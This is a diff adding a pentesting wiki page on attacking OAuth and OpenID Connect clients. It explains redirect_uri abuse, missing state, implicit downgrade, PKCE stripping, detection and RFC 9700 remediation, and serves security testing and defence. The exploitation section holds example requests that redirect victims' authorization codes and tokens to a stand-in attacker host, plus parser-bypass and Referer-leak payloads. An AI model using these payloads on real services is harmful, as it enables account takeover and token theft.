@@ -1,0 +1,111 @@
+---
+title: "Attacking OAuth and OpenID Connect: redirect_uri abuse, missing state, and code/token theft"
+description: How a pentester steals authorization codes and tokens from OAuth/OIDC relying parties—weak redirect_uri validation, open-redirect chaining, missing state/nonce, implicit downgrade, and PKCE stripping—with example requests, detection, and remediation.
+keywords:
+  - OAuth
+  - OpenID Connect
+  - redirect_uri
+  - account takeover
+  - state CSRF
+  - PKCE
+---
+
+# OAuth redirect misconfiguration
+
+Relying-party (client) bugs in the OAuth 2.0 / OpenID Connect (OIDC) authorization-code flow that let an attacker steal a victim's authorization code or token, or bind the victim's account to an attacker-controlled identity. The result is **account takeover**, often pre-authentication and without any victim interaction beyond loading a link.
+
+> **Scope.** For authorized testing and labs only. OAuth attacks cross trust boundaries between a client and an identity provider—test only applications you are permitted to assess, and never exfiltrate real users' codes or tokens outside the engagement.
+
+## Overview
+
+In the authorization-code flow, the client redirects the browser to the authorization server (AS) `/authorize` with `client_id`, `redirect_uri`, `response_type=code`, `scope`, and (for OIDC/public clients) `state`, `nonce`, and PKCE (`code_challenge`). After the user authenticates and consents, the AS redirects back to `redirect_uri` with `?code=…&state=…`; the client's backend then exchanges the code (plus `client_secret` or the PKCE `code_verifier`) for tokens.
+
+Two parameters carry the security of the whole dance: **`redirect_uri`** (where the code is delivered—must be validated by exact match) and **`state`** (an unguessable value bound to the user's session that defends the callback against CSRF). OAuth 2.0 Security BCP (RFC 9700 §2.1) requires **exact string matching** of `redirect_uri`, with the sole exception of a variable port for `localhost` native apps. Nearly every attack below is a relaxation of that rule or a missing `state`/`nonce`/PKCE check.
+
+## How it works
+
+`redirect_uri` validation breaks wherever the AS does anything weaker than exact match:
+
+- **Prefix / substring / "starts-with"** — registered `https://client.com/callback` accepts `https://client.com.attacker.net/callback` or `https://client.com/callback.attacker.com`.
+- **Subdirectory tolerance** — any path on the host is accepted; pivot via an open redirector or an HTML-injection page on that host.
+- **Wildcard / regex flaws** — `https://*.site.example/*` may permit `https://attacker.example/.site.example`; unescaped `.` in regex.
+- **URL-parser discrepancies** between validator and browser — `https://client.com&@attacker.net#@x.attacker.net/`, `@` userinfo, backslashes, encoded characters.
+- **Parameter pollution** — two `redirect_uri` values; the validator reads one, the redirect uses the other.
+- **Scheme downgrade** — an `http://` callback enables network interception.
+
+## Exploitation
+
+### Direct code theft via redirect_uri
+
+Point `redirect_uri` at your server. If the AS still holds a live session for the victim and skips re-consent, the code is delivered to you:
+
+```
+GET /authorize?client_id=12345
+  &redirect_uri=https://client-app.com.attacker.net/callback
+  &response_type=code&scope=openid%20profile&state=xyz HTTP/1.1
+Host: oauth-as.com
+
+→ 302 https://client-app.com.attacker.net/callback?code=VICTIM_CODE&state=xyz
+```
+
+Your server logs `VICTIM_CODE`; replay it against the real `/callback` to obtain the session. Note a fresh attacker-chosen `state` does not stop this—the attacker controls their own value.
+
+**Parameter pollution** variant:
+
+```
+GET /authorize?client_id=12345
+  &redirect_uri=https://client-app.com/callback
+  &redirect_uri=https://attacker.net&response_type=code&scope=openid HTTP/1.1
+```
+
+### Open-redirect chaining and Referer leakage
+
+When external redirect targets are blocked, chain an **open redirector** on a whitelisted host (`?returnUrl=`, `?redirect_to=`); with fragment reattachment a token in the URL fragment survives onto the attacker domain. Alternatively, set `redirect_uri` to a whitelisted page where you can inject `<img src="https://attacker.net">`—some browsers leak the full callback URL (including `?code=`) in the `Referer`. Third-party JavaScript on the callback page can leak it the same way (the Detectify/LastPass case).
+
+### Missing state → login CSRF / identity binding
+
+If `state` is absent or never verified, capture *your own* authorization code, then trick the victim into loading `…/callback?code=ATTACKER_CODE`. The victim's client account silently binds to the **attacker's** identity-provider account; the attacker later logs in and sees everything the victim adds. RFC 9700 §4.7.1 notes that if the attacker can read the response they can also replay a leaked `state`—only PKCE robustly defends this.
+
+### Implicit downgrade and PKCE stripping
+
+Flip `response_type=code` to `token` to receive the token directly in the fragment, where leakage is easier:
+
+```
+GET /authorize?...&response_type=token&scope=openid%20email&state=xyz
+→ 302 …/callback#access_token=VICTIM_TOKEN&token_type=Bearer
+```
+
+Where PKCE is not enforced, strip `code_challenge` or downgrade `S256`→`plain` to enable code injection.
+
+### Token / identity-binding confusion
+
+A client that exchanges or accepts a token without verifying its `aud`/`iss`/issuing client can be fed a code or token minted for a *different* application and upgrade it to a first-party session (the Salt Labs "Oh-Auth" Grammarly/Vidio/Bukalapak and Booking.com cases). A related path is **pre-account-takeover**: register at the IdP with the victim's unverified email; a client that trusts the IdP-asserted email merges you into the victim's account.
+
+## Detection (code review)
+
+Weak `redirect_uri` validation smells: `startsWith`, `contains`, `indexOf`, `LIKE 'https://host%'`, or `.match(/regex/)` over the redirect URI instead of equality; regex anchored only at the start or with unescaped `.`. State/nonce/PKCE gaps: an authorization request built without `state`/`nonce`; a callback handler that never re-reads and compares them against the session; an `id_token` decoded without verifying `nonce`, `aud`, `iss`, signature, and `exp`; a token exchange that omits `code_verifier`.
+
+Grep: `redirect_uri`, `redirectUri`, `startsWith`, `indexOf`, `contains`, `state`, `nonce`, `code_verifier`, `code_challenge`, `response_type`, `verifyIdToken`, `aud`, `iss`. Inspect `/.well-known/openid-configuration` and `/.well-known/oauth-authorization-server` for supported `response_types`, `response_modes`, and PKCE methods.
+
+## Remediation
+
+Per RFC 9700: enforce **exact-match `redirect_uri` allowlisting** (no wildcards/patterns except the `localhost` port for native apps); require **HTTPS** redirect URIs and eliminate open redirectors on whitelisted hosts; make **PKCE mandatory** (`S256`) for public clients; send a one-time, unguessable, session-bound **`state`** and verify it on callback; for OIDC, send and verify **`nonce`** plus `iss`/`aud`/signature/`exp`; avoid the implicit grant; and bind the issuer per request to defeat mix-up attacks.
+
+## Tools
+
+- **Burp Suite** (Repeater/Intruder; the **EsPReSSO** and **OAuthScan**-style extensions for flow analysis).
+- A controlled **exploit server** to receive redirected codes/tokens during authorized testing.
+
+## References
+
+- PortSwigger Web Security Academy — [OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
+- RFC 9700 — [Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700.html); RFC 6749 — [The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749); RFC 7636 — [PKCE](https://www.rfc-editor.org/rfc/rfc7636)
+- OpenID Connect Core 1.0 — [`nonce` §3.1.3.7, §15.5.2](https://openid.net/specs/openid-connect-core-1_0.html)
+- Salt Labs — [Oh-Auth: Abusing OAuth to take over millions of accounts](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts)
+- Detectify Labs — [How I made LastPass give me all your passwords](https://labs.detectify.com/writeups/how-i-made-lastpass-give-me-all-your-passwords/)
+
+## See also
+
+- [Authentication (parent)](index.md)
+- [Password reset and invite tokens](password-reset-and-invite-tokens.md)
+- [Query parameter request forgery](../injection/request-forgery/query/index.md) — open-redirect primitives that chain into these attacks.
